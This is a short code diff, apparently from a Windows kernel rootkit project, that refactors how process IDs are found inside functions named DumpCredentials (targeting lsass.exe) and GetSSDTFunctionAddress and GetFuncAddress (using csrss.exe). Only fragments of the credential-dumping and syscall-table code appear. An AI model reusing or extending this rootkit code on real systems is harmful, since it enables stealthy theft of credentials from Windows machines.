@@ -1,9 +1,5 @@
 #include "pch.h"
-#include <bcrypt.h>
 #include "MemoryUtils.h"
-#include "ProcessHandler.h"
-#include "MemoryAllocator.hpp"
-#include "MemoryHelper.hpp"
 
 MemoryUtils::MemoryUtils() {
 	this->hiddenDrivers.Count = 0;
@@ -637,12 +633,14 @@ NTSTATUS MemoryUtils::DumpCredentials(ULONG* AllocationSize) {
 	if (this->lastLsassInfo.LastCredsIndex != 0)
 		return STATUS_ABANDONED;
 
-	NTSTATUS status = NidhoggProcessHandler->FindPidByName(L"lsass.exe", &lsassPid);
+	__try {
+		lsassPid = FindPidByName(L"lsass.exe");
+	}
+	__except (EXCEPTION_EXECUTE_HANDLER) {
+		return GetExceptionCode();
+	}
 
-	if (!NT_SUCCESS(status))
-		return status;
-
-	status = PsLookupProcessByProcessId(ULongToHandle(lsassPid), &lsass);
+	NTSTATUS status = PsLookupProcessByProcessId(ULongToHandle(lsassPid), &lsass);
 
 	if (!NT_SUCCESS(status))
 		return status;
@@ -1286,12 +1284,15 @@ PVOID MemoryUtils::GetSSDTFunctionAddress(const char* functionName) {
 	ULONG index = 0;
 	UCHAR syscall = 0;
 	ULONG csrssPid = 0;
-	NTSTATUS status = NidhoggProcessHandler->FindPidByName(L"csrss.exe", &csrssPid);
 
-	if (!NT_SUCCESS(status))
+	__try {
+		csrssPid = FindPidByName(L"csrss.exe");
+	}
+	__except (EXCEPTION_EXECUTE_HANDLER) {
 		return functionAddress;
+	}
 
-	status = PsLookupProcessByProcessId(ULongToHandle(csrssPid), &CsrssProcess);
+	NTSTATUS status = PsLookupProcessByProcessId(ULongToHandle(csrssPid), &CsrssProcess);
 
 	if (!NT_SUCCESS(status))
 		return functionAddress;
@@ -1342,20 +1343,21 @@ PVOID MemoryUtils::GetSSDTFunctionAddress(const char* functionName) {
 * @status		[NTSTATUS]		 -- STATUS_SUCCESS if found, else error.
 */
 PVOID MemoryUtils::GetFuncAddress(const char* functionName, const wchar_t* moduleName, ULONG pid) {
-	NTSTATUS status;
 	KAPC_STATE state;
 	PEPROCESS CsrssProcess = NULL;
 	PVOID functionAddress = NULL;
 	ULONG searchedPid = pid;
 
 	if (searchedPid == 0) {
-		status = NidhoggProcessHandler->FindPidByName(L"csrss.exe", &searchedPid);
-
-		if (!NT_SUCCESS(status))
+		__try {
+			searchedPid = FindPidByName(L"csrss.exe");
+		}
+		__except (EXCEPTION_EXECUTE_HANDLER) {
 			return functionAddress;
+		}
 	}
 
-	status = PsLookupProcessByProcessId(ULongToHandle(searchedPid), &CsrssProcess);
+	NTSTATUS status = PsLookupProcessByProcessId(ULongToHandle(searchedPid), &CsrssProcess);
 
 	if (!NT_SUCCESS(status))
 		return functionAddress;
